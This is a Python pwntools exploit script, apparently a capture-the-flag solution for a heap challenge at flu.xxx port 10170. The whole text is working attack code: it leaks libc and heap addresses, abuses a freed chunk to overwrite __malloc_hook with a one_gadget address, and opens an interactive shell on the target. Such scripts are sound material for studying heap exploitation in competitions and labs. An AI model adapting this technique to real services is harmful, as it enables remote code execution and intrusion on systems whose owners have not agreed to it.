from pwn import *

###Util
def create(name, size):
    r.sendlineafter(b'>>> ', b'1')
    r.sendafter(b'? ', name)
    r.sendlineafter(b'? ', str(size).encode())

def delete(idx):
    r.sendlineafter(b'>>> ', b'2')
    r.sendlineafter(b'? ', str(idx).encode())

def edit(idx, data):
    r.sendlineafter(b'>>> ', b'3')
    r.sendlineafter(b'? ', str(idx).encode())
    r.sendafter(b'?', data)

def show():
    r.sendlineafter(b'>>> ', b'4')
    res = r.recvuntil(b'\nrooms: ', drop=True).split(b'room-')[1:]
    for i in range(len(res)):
        res[i] = b': '.join(res[i].split(b': ')[1:])
    return res

###Addr
malloc_hook_offset = 0x3aabf0
one_gadget_offset = 0x40e8a

###Exploit
r = remote('flu.xxx', 10170)

r.recvuntil(b': 0x')
libc_base = int(r.recvline()[:-1], 16)
print(hex(libc_base))

create(b'a'*0x10, 0x68)
heap = u64(show()[0][0x10:].ljust(8, b'\x00')) - 0x10
print(hex(heap))

create(b'M30W', 0x18)
delete(0)
edit(0, p64(libc_base + malloc_hook_offset - 0x23))
create(b'M30W', 0x68)
create(b'M30W', 0x68)
edit(3, b'\x00'*0x13 + p64(libc_base+one_gadget_offset))

r.interactive()
